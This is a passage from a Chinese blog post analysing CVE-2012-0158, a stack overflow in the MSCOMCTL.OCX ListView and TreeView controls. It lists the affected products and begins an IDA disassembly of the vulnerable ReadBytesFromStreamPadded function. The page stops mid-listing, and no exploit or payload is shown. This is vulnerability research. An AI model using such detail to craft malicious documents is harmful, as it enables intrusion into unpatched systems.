<!DOCTYPE html>
<html lang="en, zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech">
    
    <meta name="author" content="7erry">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://7erryX.github.io/2024/08/18/vulnerability investigation/cve-2012-0158-漏洞研究/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2012-0158 漏洞研究">
<meta property="og:url" content="https://7erryx.github.io/2024/08/18/Vulnerability%20Investigation/CVE-2012-0158-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/index.html">
<meta property="og:site_name" content="7erry&#39;s Website">
<meta property="og:description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]">
<meta property="og:locale">
<meta property="og:image" content="https://7erryx.github.io/images/default_avatar.png">
<meta property="article:published_time" content="2024-08-18T11:09:19.000Z">
<meta property="article:modified_time" content="2024-08-18T11:09:19.000Z">
<meta property="article:author" content="7erry">
<meta property="article:tag" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://7erryx.github.io/images/default_avatar.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            CVE-2012-0158 漏洞研究 | 7erry&#39;s Website
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    
        
<script src="/js/build/libs/anime.min.js"></script>

    

    <script id="hexo-configurations">
    window.config = {"hostname":"7erryx.github.io","root":"/","language":"en, zh-CN","path":"search.json"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/default_avatar.png","description":"(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background_light.jpg","dark":"/images/background_dark.jpg"},"title":"7erry's Website","subtitle":{"text":["君子慎独","君子不器","我的人生烷基八氮了","Fall in Love with the Problem, Not the Solution","Do The Right Thing，Do The Thing Right","Lux et veritas","Mens et Manus","Per Aspera Ad Astra","(v50) 経験に3を加えて，失礼します [中国翻訳] [無修正]","呐呐呐，你听说过二刺螈吗?","取势，明道，优术","做难而正确的事"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#000","dark":"#fff"},"text_style":{"title_size":"5.7rem","subtitle_size":"1.9rem","line_height":1.1},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/7erryX","instagram":null,"zhihu":null,"twitter":null,"email":"w.7erry@qq.com","bilibili":"https://space.bilibili.com/25689965"},"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.8.4","navbar":{"auto_hide":true,"color":{"left":"#7ab8cc","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Anime":{"path":"/bangumis","icon":"fa-brands fa-youtube"},"Cinema":{"path":"/cinemas","icon":"fa-solid fa-film"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":1},"tags":{"enable":false,"limit":3}},"footerStart":"2020/2/2 20:20:22"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    <h2 class="ml13">
        7erry&#39;s Website
    </h2>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }
    </script>
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-xs">
                </a>
            
            <a class="logo-title" href="/">
                
                7erry&#39;s Website
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bangumis"
                                        >
                                    <i class="fa-brands fa-youtube fa-fw"></i>
                                    ANIME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/cinemas"
                                        >
                                    <i class="fa-solid fa-film fa-fw"></i>
                                    CINEMA
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    ABOUT
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bangumis"
                        >
                            <span>
                                ANIME
                            </span>
                            
                                <i class="fa-brands fa-youtube fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/cinemas"
                        >
                            <span>
                                CINEMA
                            </span>
                            
                                <i class="fa-solid fa-film fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about"
                        >
                            <span>
                                ABOUT
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">65</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2012-0158 漏洞研究</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/default_avatar.png">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">7erry</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-08-18 19:09:19</span>
        <span class="mobile">2024-08-18 19:09:19</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-08-18 19:09:19</span>
            <span class="mobile">2024-08-18 19:09:19</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Vulnerability-Investigation/">Vulnerability Investigation</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.7k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>26 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p>CVE-2012-0158 在 CVE-2017-0199 出现前的 5 年时间中总会在各大安全公司的通用漏洞榜单中名列前茅。首次被披露于 2015 年 6 月报道出的名为 “Lotus Blossom 行动” 的攻击事件。其成因是 Microsoft Windows 通用控件中的 MSCOMCTL.TreeView、MSCOMCTL.TreeView2、MSCOMCTL.ListView2、MSCOMCTL.ListView 控件（MSCOMCTL.OCX）中存在栈溢出漏洞，导致可被用于执行任意代码</p>
<p>影响范围：<br>Microsoft Office 2003 SP3版本、2007 SP2版本和SP3版本、 2010 Gold版本和SP1版本， Office 2003 Web Components SP3版本，SQL Server 2000 SP4版本、2005 SP4版本和2008 SP2版本、SP3版本和R2版本， BizTalk Server 2002 SP1版本，Commerce Server 2002 SP4版本、2007 SP2版本、2009 Gold版本和R2版本，Visual FoxPro 8.0 SP1版本和9.0 SP2版本和Visual Basic 6.0 Runtime版本</p>
<p>影响的操作系统：<br>Windows 2000, Windows Server 2003, Windows XP (32-bit), Windows Vista (32-bit), Windows 7 (32-bit)</p>
<span id="more"></span>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>调试运行 Word 并样本后程序因访问非法地址触发 segmentation fault 而发生崩溃（gif 图来自<a href="#reference">吾爱破解精华帖</a>）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Vulnerability%20Investigation/CVE-2012-0158_reproduction.gif"
                      alt="reproduction"
                ></p>
<p>栈回溯得到的漏洞触发执行流如下（图来自安全客上的<a href="#reference">永远的经典：CVE-2012-0158漏洞分析、利用、检测和总结</a>）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Vulnerability%20Investigation/CVE-2012-0158_flow.png"
                      alt="flow"
                ></p>
<p>Office 在解析 ListView 控件的时候，读取并加载了控件的数据流，栈溢出的越界拷贝发生在 MSCOMCTL.OCX ReadBytesFromStreamPadded 函数中，使用 IDA 打开 MSCOMCTL.OCX 定位栈溢出时程序执行的代码</p>
<blockquote>
<p>漏洞模块 MSCOMCTL.OCX 只有为数不多的几个导出函数名可以参考。不过微软的很多库都有对应的公开符号参考，例如 MSDN 或其符号服务器都能下载到各个系统与版本的库以 pdb&#x2F;dbg 为拓展名的符号文件。这些符号包含源代码编译时的各种函数名、变量等参考信息。将 MSCOMCTL.OCX 与其对应的符号文件 MSCOMCTL.dbg 放在同一个目录下用 IDA 打开能够链接解析它的各个函数地址和函数名，能够很大程度上提高逆向分析过程中的代码可读性</p>
</blockquote>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">.text:275C88F4                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:275C88F4</span><br><span class="line">.text:275C88F4                               ; Attributes: bp-based frame</span><br><span class="line">.text:275C88F4</span><br><span class="line">.text:275C88F4                               ; HRESULT __cdecl ReadBytesFromStreamPadded(char *, struct IStream *lpMem, SIZE_T dwBytes)</span><br><span class="line">.text:275C88F4                               public ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z</span><br><span class="line">.text:275C88F4                               ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z proc near</span><br><span class="line">.text:275C88F4                                                                       ; CODE XREF: CNodes::Load(IStream *)+10↑p</span><br><span class="line">.text:275C88F4                                                                       ; CNodes::Load(IStream *)+40↑p</span><br><span class="line">.text:275C88F4                                                                       ; CNode::Load(IStream *)+26↓p</span><br><span class="line">.text:275C88F4                                                                       ; CNode::Load(IStream *)+60↓p</span><br><span class="line">.text:275C88F4                                                                       ; CObj::Load(IStream *)+13↓p</span><br><span class="line">.text:275C88F4                                                                       ; CObj::Load(IStream *)+3E↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListItem::Load(IStream *)+21↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListItem::Load(IStream *)+4F↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListItem::Load(IStream *)+98↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListItems::Load(IStream *)+10↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListItems::Load(IStream *)+3E↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListSubItem::Load(IStream *)+23↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListSubItem::Load(IStream *)+51↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListSubItem::Load(IStream *)+CC↓p</span><br><span class="line">.text:275C88F4                                                                       ; CListSubItems::Load(IStream *)+10↓p ...</span><br><span class="line">.text:275C88F4</span><br><span class="line">.text:275C88F4                               var_4= dword ptr -4</span><br><span class="line">.text:275C88F4                               arg_0= dword ptr  8</span><br><span class="line">.text:275C88F4                               lpMem= dword ptr  0Ch</span><br><span class="line">.text:275C88F4                               dwBytes= dword ptr  10h</span><br><span class="line">.text:275C88F4</span><br><span class="line">.text:275C88F4                               ; FUNCTION CHUNK AT .text:275D3DDB SIZE 00000014 BYTES</span><br><span class="line">.text:275C88F4</span><br><span class="line">.text:275C88F4 55                            push    ebp</span><br><span class="line">.text:275C88F5 8B EC                         mov     ebp, esp</span><br><span class="line">.text:275C88F7 51                            push    ecx</span><br><span class="line">.text:275C88F8 53                            push    ebx</span><br><span class="line">.text:275C88F9 8B 5D 0C                      mov     ebx, [ebp+lpMem]</span><br><span class="line">.text:275C88FC 56                            push    esi</span><br><span class="line">.text:275C88FD 33 F6                         xor     esi, esi</span><br><span class="line">.text:275C88FF 8B 03                         mov     eax, [ebx]</span><br><span class="line">.text:275C8901 57                            push    edi</span><br><span class="line">.text:275C8902 56                            push    esi</span><br><span class="line">.text:275C8903 8D 4D FC                      lea     ecx, [ebp+var_4]</span><br><span class="line">.text:275C8906 6A 04                         push    4</span><br><span class="line">.text:275C8908 51                            push    ecx</span><br><span class="line">.text:275C8909 53                            push    ebx</span><br><span class="line">.text:275C890A FF 50 0C                      call    dword ptr [eax+0Ch]</span><br><span class="line">.text:275C890A</span><br><span class="line">.text:275C890D 3B C6                         cmp     eax, esi</span><br><span class="line">.text:275C890F 7C 78                         jl      short loc_275C8989</span><br><span class="line">.text:275C890F</span><br><span class="line">.text:275C8911 8B 7D 10                      mov     edi, [ebp+dwBytes]</span><br><span 